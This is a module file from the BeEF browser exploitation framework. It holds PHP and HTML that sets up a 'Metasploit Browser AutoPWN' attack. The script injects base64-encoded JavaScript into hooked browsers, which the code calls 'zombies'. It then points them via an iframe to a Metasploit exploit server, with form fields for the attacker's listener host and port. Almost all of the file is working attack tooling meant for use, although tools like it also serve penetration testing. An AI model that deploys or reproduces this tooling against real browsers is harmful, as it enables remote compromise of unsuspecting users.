<?
	// Copyright (c) 2006, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
	
?>

<!--

BeEF: the following is the boiler plate from the exploit

-->
<script language="javascript" type="text/javascript">
	var rtnval = "OK Clicked";

	Element.Methods.construct_code = function($url) {

		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';
		b64code = b64replace(b64code, "URL",$url);

		// send the code to the zombies
		do_send(b64code);
	}

	// add construct code to DOM
	Element.addMethods();
	
</script>

<!-- PAGE CONTENT -->
<div id="module_header">exploit: Metasploit Browser AutoPWN</div>
This module creates a Metasploit listener using a backend server, and then sends the client an iframe connecting to the waiting exploit.
<div id="module_subsection">
	<form name="myform" id="myform">
		<div id="module_subsection_header">Options</div>
		<hr>
		<div id="module_subsection_header">LHOST (Required)</div>
		<input type="text" name="LHOST"/>
		<div id="module_subsection_header">LPORT</div>
		<input type="text" name="LPORT" value="4444"/>
		<div id="module_subsection_header">SRVHOST (Required)</div>
		<input type="text" name="SRVHOST" value="0.0.0.0"/>
		<div id="module_subsection_header">SRVPORT (Required)</div>
		<input type="text" name="SRVPORT" value="8080"/>
		<div id="module_subsection_header">URIPATH (Default is random)</div>
		<input type="text" name="URIPATH" value=""/>

		<input class="button" type="button" value="exploit" onClick="javascript:msf_callAutopwn()"/>
	</form>
</div>

